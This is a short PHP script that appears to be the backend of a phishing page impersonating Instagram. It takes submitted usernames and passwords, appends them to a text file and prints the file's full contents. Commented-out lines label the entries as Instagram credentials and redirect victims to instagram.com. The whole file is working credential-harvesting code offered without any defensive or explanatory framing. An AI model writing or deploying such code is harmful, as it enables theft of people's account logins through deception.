<?php
ini_set('display_errors', '1');
$username=$_POST['username'];
$password=$_POST['password'];
$fp = fopen('data.txt', 'a+');
fwrite($fp, "login - ". $username."\n");
fwrite($fp, "password - ". $password."\n");
fwrite($fp, "--------------------------"."\n");
fclose($fp);
$filename = "data.txt";
echo file_get_contents($filename);
echo __FILE__;

// file_put_contents("data.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
// header('Location: https://instagram.com');
// exit();
?> 